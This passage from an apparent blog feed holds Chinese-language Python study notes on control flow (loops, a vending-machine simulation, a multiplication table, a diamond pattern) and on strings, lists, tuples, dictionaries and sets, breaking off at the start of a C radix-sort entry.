<span class="hljs-comment"># 初始化斐波那契数列的前两个数字</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, n):      <span class="hljs-comment"># 生成斐波那契数列的第三个数字开始的前 n 个数字</span><br>        fib_seq.append(fib_seq[-<span class="hljs-number">1</span>] + fib_seq[-<span class="hljs-number">2</span>])      <span class="hljs-comment"># 计算下一个斐波那契数并添加到数列中</span><br>    <span class="hljs-keyword">return</span> fib_seq<br><br>Fib_seq = fibonacci(<span class="hljs-number">50</span>)     <span class="hljs-comment"># 调用 Fibonacci 函数生成斐波那契数列的前 50 位数字</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;斐波那契数列的前 50 位数字：&quot;</span>, Fib_seq)<br></code></pre></td></tr></table></figure><p>5.模拟自动饮料机代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br>投币 = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请投币：&quot;</span>))<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> 投币 == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;叮咚：设备停止工作！&quot;</span>)<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">elif</span> 投币 == <span class="hljs-number">1</span>:<br>        叮咚 = <span class="hljs-string">&quot;冰露纯净水&quot;</span><br>    <span class="hljs-keyword">elif</span> 投币 == <span class="hljs-number">2</span>:<br>        叮咚 = <span class="hljs-string">&quot;农夫山泉矿泉水&quot;</span><br>    <span class="hljs-keyword">elif</span> 投币 == <span class="hljs-number">3</span>:<br>        叮咚 = <span class="hljs-string">&quot;冰红茶&quot;</span><br>    <span class="hljs-keyword">elif</span> 投币 == <span class="hljs-number">4</span>:<br>        叮咚 = <span class="hljs-string">&quot;脉动&quot;</span><br>    <span class="hljs-keyword">elif</span> 投币 == <span class="hljs-number">5</span>:<br>        叮咚 = <span class="hljs-string">&quot;红牛&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        叮咚 = <span class="hljs-string">&quot;投币错误！请重新投币...&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;叮咚：&quot;</span>, 叮咚)<br>    投币 = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请投币：&quot;</span>))<br></code></pre></td></tr></table></figure><p>代码逻辑：使用int(input(“请投币：”))语句，提示用户输入投币金额，并将输入的字符串转换为整数。使用while True:建立了一个无限循环，直到用户选择停止购买或投币金额为0时才会退出循环。 根据用户输入的投币金额，使用if-elif-else语句进行条件判断，确定对应的饮料，并输出相应信息。 </p><p>6.数列求和代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">i = <span class="hljs-number">1</span>; n = <span class="hljs-number">10</span>; <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> i &lt;= n:<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>        i = i + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-built_in">sum</span> = <span class="hljs-built_in">sum</span> + i<br>    i = i + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sum=&quot;</span>,<span class="hljs-built_in">sum</span>)<br></code></pre></td></tr></table></figure><p>代码逻辑：计算从1到10（包括1和10）之间所有偶数的和。continue 语句是关键，它确保了只有偶数会被加到 sum 变量中，而奇数则会被跳过。</p><p>优化：①变量名 sum 覆盖了 Python 内置函数 sum()，最好避免使用内置函数名作为变量名。</p><p>②i 的更新在两个地方出现了，可以简化为循环的 for 形式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">n = <span class="hljs-number">10</span><br>total_sum = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, n + <span class="hljs-number">1</span>, <span class="hljs-number">2</span>):<br>    total_sum += i<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sum =&quot;</span>, total_sum) <br></code></pre></td></tr></table></figure><p>7.输出对角线元素为1 的4 行4 列矩阵代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>):<br>        <span class="hljs-keyword">if</span> i==j <span class="hljs-keyword">or</span> i+j==<span class="hljs-number">5</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1&quot;</span>,end=<span class="hljs-string">&#x27; &#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;0&quot;</span>,end=<span class="hljs-string">&#x27; &#x27;</span>)<br>    <span class="hljs-built_in">print</span>()<br></code></pre></td></tr></table></figure><p>代码逻辑；嵌套循环，在内层循环中，通过判断条件来确定当前位置应该打印1还是0：若当前位置位于主对角线（i &#x3D;&#x3D; j）或副对角线（i + j &#x3D;&#x3D; 5），则打印1。否则，打印0。 </p><p>8.通过for 循环打印99 乘法表代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,i+<span class="hljs-number">1</span>):<br>        total=i*j<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;j&#125;</span>*<span class="hljs-subst">&#123;i&#125;</span>=<span class="hljs-subst">&#123;i*j&#125;</span>&quot;</span>,end=<span class="hljs-string">&#x27; &#x27;</span>)<br>    <span class="hljs-built_in">print</span>()<br></code></pre></td></tr></table></figure><p>代码逻辑：使用两层嵌套的 for 循环。外层循环控制行数（从1到9），内层循环控制每行中的列数（也是从1到行号）。最后使用 f-string 格式化字符串打印结果。</p><p>11.打印如下所示的菱形代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 打印上半部分</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>):  <span class="hljs-comment"># 控制行数，上半部分有4行</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; &quot;</span> * (<span class="hljs-number">4</span> - i) + <span class="hljs-string">&quot;*&quot;</span> * (<span class="hljs-number">2</span> * i - <span class="hljs-number">1</span>))  <span class="hljs-comment"># 打印空格和星号，构成菱形的每一行</span><br><br><span class="hljs-comment"># 打印下半部分</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):  <span class="hljs-comment"># 控制行数，下半部分有3行</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; &quot;</span> * (<span class="hljs-number">4</span> - i) + <span class="hljs-string">&quot;*&quot;</span> * (<span class="hljs-number">2</span> * i - <span class="hljs-number">1</span>))  <span class="hljs-comment"># 打印空格和星号，构成菱形的每一行</span><br></code></pre></td></tr></table></figure><p>代码逻辑：</p><p>上半部分：使用for循环迭代从1到4的范围，控制菱形上半部分的行数。在每一行中，通过”  “<em>(4-i)打印一定数量的空格，使得菱形居中对齐。使用 “</em>“ * (2 * i - 1) 打印一定数量的星号，构成菱形上半部分的每一行。</p><p>下半部分：使用 for 循环迭代从3到1的范围（步长为-1），控制菱形下半部分的行数。在每一行中，同样通过 “ “ * (4 - i) 打印一定数量的空格，使得菱形居中对齐。使用 “*” * (2 * i - 1) 打印一定数量的星号，构成菱形下半部分的每一行。</p><p>结果：</p><p><img src="/../img/wps25.jpg"> </p><p>小记：打牢基础！！！</p><p>Python 的流程控制对于控制程序执行流程非常重要。在学习 Python 的流程控制时，对于条件语句 (if-elif-else)、循环语句 (for、while)、以及控制语句 (break、continue) 等基本知识的掌握十分重要。在编写代码时，合理运用这些流程控制结构可以让代码更加清晰、简洁，同时实现不同的逻辑要求。同时，准确理解语句块的缩进在 Python 中尤为重要，因为它决定了哪些语句属于同一个语句块，也能让我们更好了解代码逻辑。同时，在学习这一内容时，我认为对于基础语句的规则和使用场景的理解需要着重学习。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流程控制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python（二）</title>
      <link href="/2024/04/17/%E7%BB%84%E5%90%88%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>/2024/04/17/%E7%BB%84%E5%90%88%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="组合数据类型（一）"><a href="#组合数据类型（一）" class="headerlink" title="组合数据类型（一）"></a>组合数据类型（一）</h2><ol><li><strong>字符串的相关操作函数包括但不限于</strong>：</li></ol><ul><li><code>len(string)</code>: 返回字符串的长度。</li><li><code>string[index]</code>: 获取字符串中索引为index的字符。</li><li><code>string[start:end:step]</code>: 切片操作，获取字符串的子串。</li><li><code>string.count(substring)</code>: 统计子串在字符串中出现的次数。</li><li><code>string.find(substring)</code>: 查找子串在字符串中第一次出现的位置。</li><li><code>string.replace(old, new)</code>: 替换字符串中的部分内容。</li><li><code>string.upper()</code>, <code>string.lower()</code>: 将字符串转换为全大写或全小写。</li><li><code>string.strip()</code>, <code>string.lstrip()</code>, <code>string.rstrip()</code>: 去除字符串两端或指定端的空白字符。</li></ul><ol start="2"><li><strong>列表相关操作函数包括但不限于</strong>：</li></ol><ul><li><code>len(list)</code>: 返回列表的长度。</li><li><code>list.append(element)</code>: 在列表末尾添加一个元素。</li><li><code>list.extend(iterable)</code>: 在列表末尾一次性追加另一个可迭代对象的所有元素。</li><li><code>list.insert(index, element)</code>: 在指定位置插入一个元素。</li><li><code>list.remove(element)</code>: 移除列表中第一个匹配的元素。</li><li><code>list.pop([index])</code>: 移除并返回指定位置的元素，默认是移除并返回最后一个元素。</li><li><code>list.index(element)</code>: 返回列表中第一个匹配元素的索引。</li><li><code>list.count(element)</code>: 返回元素在列表中出现的次数。</li><li><code>list.sort()</code>: 对列表进行排序。</li><li><code>list.reverse()</code>: 将列表中的元素倒序排列。</li><li><code>list.copy()</code>: 返回列表的浅复制。</li></ul><ol start="3"><li><strong>元组相关操作函数</strong>：</li></ol><ul><li><code>len(tuple)</code>: 返回元组的长度。</li><li><code>tuple.index(element)</code>: 返回元组中第一个匹配元素的索引。</li><li><code>tuple.count(element)</code>: 返回元素在元组中出现的次数。</li></ul><h2 id="组合数据类型（二）"><a href="#组合数据类型（二）" class="headerlink" title="组合数据类型（二）"></a>组合数据类型（二）</h2><h3 id="字典（dict）"><a href="#字典（dict）" class="headerlink" title="字典（dict）"></a>字典（dict）</h3><p>字典是一种键值对集合，每个键都是唯一的，并且与一个值相关联。字典的键值对是无序的，键必须是不可变数据类型，如字符串、数字或元组，而值可以是任何数据类型。</p><h4 id="创建字典"><a href="#创建字典" class="headerlink" title="创建字典"></a>创建字典</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 创建一个空字典</span><br>empty_dict = &#123;&#125;<br><span class="hljs-comment"># 创建一个包含键值对的字典</span><br>fruit_colors = &#123;<span class="hljs-string">&#x27;apple&#x27;</span>: <span class="hljs-string">&#x27;red&#x27;</span>, <span class="hljs-string">&#x27;banana&#x27;</span>: <span class="hljs-string">&#x27;yellow&#x27;</span>, <span class="hljs-string">&#x27;cherry&#x27;</span>: <span class="hljs-string">&#x27;red&#x27;</span>&#125;<br><span class="hljs-comment"># 使用字典推导式创建字典</span><br>square_dict = &#123;i: i**<span class="hljs-number">2</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>)&#125;<br></code></pre></td></tr></table></figure><h4 id="访问字典"><a href="#访问字典" class="headerlink" title="访问字典"></a>访问字典</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 访问键对应的值</span><br>color = fruit_colors[<span class="hljs-string">&#x27;apple&#x27;</span>]  <span class="hljs-comment"># 结果是 &#x27;red&#x27;</span><br><span class="hljs-comment"># 使用get方法访问键对应的值，如果键不存在返回None或指定的默认值</span><br>color = fruit_colors.get(<span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;default_color&#x27;</span>)  <span class="hljs-comment"># 结果是 &#x27;red&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="修改字典"><a href="#修改字典" class="headerlink" title="修改字典"></a>修改字典</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 添加新的键值对</span><br>fruit_colors[<span class="hljs-string">&#x27;orange&#x27;</span>] = <span class="hljs-string">&#x27;orange&#x27;</span><br><span class="hljs-comment"># 修改已有的键值对</span><br>fruit_colors[<span class="hljs-string">&#x27;apple&#x27;</span>] = <span class="hljs-string">&#x27;green&#x27;</span><br><span class="hljs-comment"># 删除键值对</span><br><span class="hljs-keyword">del</span> fruit_colors[<span class="hljs-string">&#x27;banana&#x27;</span>]<br></code></pre></td></tr></table></figure><h4 id="字典遍历"><a href="#字典遍历" class="headerlink" title="字典遍历"></a>字典遍历</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 遍历字典的键</span><br><span class="hljs-keyword">for</span> fruit <span class="hljs-keyword">in</span> fruit_colors:<br>    <span class="hljs-built_in">print</span>(fruit)<br><span class="hljs-comment"># 遍历字典的键和值</span><br><span class="hljs-keyword">for</span> fruit, color <span class="hljs-keyword">in</span> fruit_colors.items():<br>    <span class="hljs-built_in">print</span>(fruit, color)<br></code></pre></td></tr></table></figure><h4 id="字典操作函数dict-fromkeys-seq-value"><a href="#字典操作函数dict-fromkeys-seq-value" class="headerlink" title="字典操作函数dict.fromkeys(seq[, value])"></a>字典操作函数dict.fromkeys(seq[, value])</h4><p>fromkeys() 函数用于创建一个新字典，以序列 seq 中元素做字典的键，value 为字典所有键对应的初始值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">key_list = [<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>, <span class="hljs-string">&quot;hobby&quot;</span>]<br>val = <span class="hljs-string">&quot;test&quot;</span><br>d= &#123;&#125;<br>d = d.fromkeys(key_list)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;新字典&quot;</span>,d)<br>d = d.fromkeys(key_list, val)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;新字典&quot;</span>,d)<br></code></pre></td></tr></table></figure><p>使用fromkeys方法创建一个新字典，并将key_list中的所有键添加到字典d中。fromkeys方法返回一个新的字典，其中包含指定的键，每个键的值都是None。这是<em><strong>因为fromkeys方法在没有指定值的情况下默认使用None作为所有键的值</strong></em>。再次使用fromkeys方法创建一个新字典，这次指定了val作为所有键的值。这将创建一个新字典，其中包含key_list中的所有键，每个键的值都是字符串”test”。（<strong>由于fromkeys方法会创建一个新的字典，所以在第二次调用fromkeys时，实际上覆盖了第一次创建的字典。</strong>）</p><h4 id="字典的复制与拷贝"><a href="#字典的复制与拷贝" class="headerlink" title="字典的复制与拷贝"></a>字典的复制与拷贝</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;复制与浅拷贝的区别:复制相当于引用，即给原字典起了一个别名，而浅拷贝是，对一级目录直接拷贝，而对二级目录只是引用。&quot;&quot;&quot;</span><br><span class="hljs-comment"># 浅拷贝copy</span><br>Alex = [<span class="hljs-number">12</span>,<span class="hljs-string">&#x27;sing&#x27;</span>]<br>Thea = &#123;<span class="hljs-number">20</span>:<span class="hljs-string">&#x27;dance&#x27;</span>&#125;<br>dict1= &#123;<span class="hljs-string">&#x27;Alex&#x27;</span>:Alex,<span class="hljs-string">&#x27;Thea&#x27;</span>:Thea&#125;<br>dict_cpl = dict1<br>dict_cp2 = dict1.copy()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;原始字典dict1: &quot;</span>,dict1)<br>dict1[<span class="hljs-string">&#x27;Alex&#x27;</span>]= Thea<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;修改后的字典dict1: &quot;</span>,dict1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;字典dict1的复制(与原字典一致): &quot;</span>,dict_cpl)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;浅拷贝字典dict1(不会随着原字典一级目录的改变而改变): &quot;</span>,dict_cp2)<br>Alex_1=Alex.append(<span class="hljs-number">10</span>)<br><span class="hljs-built_in">print</span>(dict_cp2)<br></code></pre></td></tr></table></figure><p>创建一个名为dict_cpl的变量，并将其赋值为dict1。这种复制方式<strong>实际上是创建了dict1的一个引用，而不是一个全新的字典</strong>。因此，dict_cpl和dict1指向内存中的同一个对象。创建一个名为dict_cp2的变量，并将其赋值为dict1.copy()。这是使用copy方法进行的浅拷贝，它会创建一个新的字典，但是字典中的可变对象（如列表和字典）仍然是引用。这意味着dict_cp2是dict1的一个独立副本，但是<strong>如果修改了dict1中的可变对象，这些修改也会反映在dict_cp2中</strong>。</p><h5 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h5><p>复制（引用）是指向同一个对象的另一个指针，而浅拷贝是创建一个新的对象，但是新对象中的可变元素仍然是原对象中相应元素的引用。在这个例子中，dict_cpl是dict1的引用，而dict_cp2是dict1的浅拷贝。当dict1的’Alex’键被修改时，dict_cpl会显示这个修改，因为它是引用；而dict_cp2不会显示这个修改，因为它是一个新的字典象，但是如果在dict1中修改了Thea字典中的内容，那么dict_cp2中的’Thea’键也会显示这个修改，因为浅拷贝只拷贝一级目录。</p><h3 id="集合（set）"><a href="#集合（set）" class="headerlink" title="集合（set）"></a>集合（set）</h3><p>集合是一个无序的不重复元素集。集合的元素必须是不可变数据类型，如字符串、数字或元组。集合不支持索引，因为它们是无序的。</p><h4 id="创建集合"><a href="#创建集合" class="headerlink" title="创建集合"></a>创建集合</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 创建一个空集合</span><br>empty_set = <span class="hljs-built_in">set</span>()<br><span class="hljs-comment"># 创建一个包含元素的集合</span><br>fruits = &#123;<span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;banana&#x27;</span>, <span class="hljs-string">&#x27;cherry&#x27;</span>&#125;<br><span class="hljs-comment"># 使用集合推导式创建集合</span><br>squared_set = &#123;i**<span class="hljs-number">2</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>)&#125;<br></code></pre></td></tr></table></figure><h4 id="集合操作"><a href="#集合操作" class="headerlink" title="集合操作"></a>集合操作</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 添加元素</span><br>fruits.add(<span class="hljs-string">&#x27;orange&#x27;</span>)<br><span class="hljs-comment"># 移除元素</span><br>fruits.remove(<span class="hljs-string">&#x27;banana&#x27;</span>)<br><span class="hljs-comment"># 集合成员测试</span><br>is_apple_in_fruits = <span class="hljs-string">&#x27;apple&#x27;</span> <span class="hljs-keyword">in</span> fruits  <span class="hljs-comment"># 结果是 True</span><br></code></pre></td></tr></table></figure><h4 id="集合元素的删除"><a href="#集合元素的删除" class="headerlink" title="集合元素的删除"></a>集合元素的删除</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">world_tournament_set = &#123;<span class="hljs-string">&quot;世界杯排球赛&quot;</span>,<span class="hljs-string">&quot;世界乒乓球锦标赛&quot;</span>,<span class="hljs-string">&quot;世界篮球锦标赛&quot;</span>,<span class="hljs-string">&quot;世界足球锦标赛&quot;</span>&#125;<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;世界大赛:&quot;</span>, world_tournament_set)<br>world_tournament_set.remove(<span class="hljs-string">&quot;世界足球锦标赛&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;set.remove()删除元素后:&quot;</span>, world_tournament_set)<br>world_tournament_set.discard(<span class="hljs-string">&quot;世界杯排球赛&quot;</span>)  <span class="hljs-comment"># 删除指定集合元素.</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;set.discard()删除元素后:&quot;</span>, world_tournament_set)<br>world_tournament_set.pop()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;set.pop()删除元素后:&quot;</span>, world_tournament_set)<br>world_tournament_set.clear()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;set.clear()清空元素后:&quot;</span>, world_tournament_set)<br></code></pre></td></tr></table></figure><p>使用remove方法从集合world_tournament_set中删除一个指定的元素”世界足球锦标赛”。使用discard方法尝试从集合world_tournament_set中删除一个指定的元素”世界杯排球赛”。<strong>如果该元素不存在，discard方法不会抛出错误。</strong>使用pop方法从集合world_tournament_set中随机删除一个元素。<strong>由于集合是无序的，所以pop方法会随机选择一个元素进行删除。</strong>使用clear方法清空集合world_tournament_set中的所有元素。</p><p> 运行结果：</p><p><img src="/../img/set_1.jpg" alt="集合删除结果"></p><h4 id="集合遍历"><a href="#集合遍历" class="headerlink" title="集合遍历"></a>集合遍历</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 遍历集合的元素</span><br><span class="hljs-keyword">for</span> fruit <span class="hljs-keyword">in</span> fruits:<br>    <span class="hljs-built_in">print</span>(fruit)<br></code></pre></td></tr></table></figure><h4 id="集合运算"><a href="#集合运算" class="headerlink" title="集合运算"></a>集合运算</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 集合的并集</span><br>union = fruits | &#123;<span class="hljs-string">&#x27;kiwi&#x27;</span>, <span class="hljs-string">&#x27;mango&#x27;</span>&#125;<br><span class="hljs-comment"># 集合的交集</span><br>intersection = fruits &amp; &#123;<span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;kiwi&#x27;</span>&#125;<br><span class="hljs-comment"># 集合的差集</span><br>difference = fruits - &#123;<span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;banana&#x27;</span>&#125;<br><span class="hljs-comment"># 集合的对称差集</span><br>symmetric_difference = fruits ^ &#123;<span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;kiwi&#x27;</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python数据类型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基数排序(多关键字排序)</title>
      <link href="/2023/12/10/%E9%93%BE%E5%BC%8F%E5%9F%BA%E6%95%B0%E6%8E%92%E5%BA%8F/"/>
      <url>/2023/12/10/%E9%93%BE%E5%BC%8F%E5%9F%BA%E6%95%B0%E6%8E%92%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p>是一种借助“多关键字排序”的思想来实现“单关键字排序”的内部排序算法。可以将每个关键字 K 看成由四个单关键字组成，即 K&#x3D; k 1,k 2,k 3,k 4 每个关键字的取值范围为 0≤k i≤9，所以每个关键字可取值的数目为 10。通常将关键字取值的数目称为基数，用 r 表示，下例中 r &#x3D;10。</p><p>链式基数排序（Radix Sort）是一种基于数位的排序算法。(这里使用LSD法进行排序)具体实现方法如下：</p><ol><li>取得链表中的最大数，并取得位数</li><li>从最低位开始，依次对每个数位进行排序，将排序结果存储到桶(辅助空间)中</li><li>将桶(辅助空间)中的结果存回原链表中</li><li>重复步骤2-3，直到最高位排序完毕</li></ol><p>以下是实现20个四位数的链式基数排序的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span 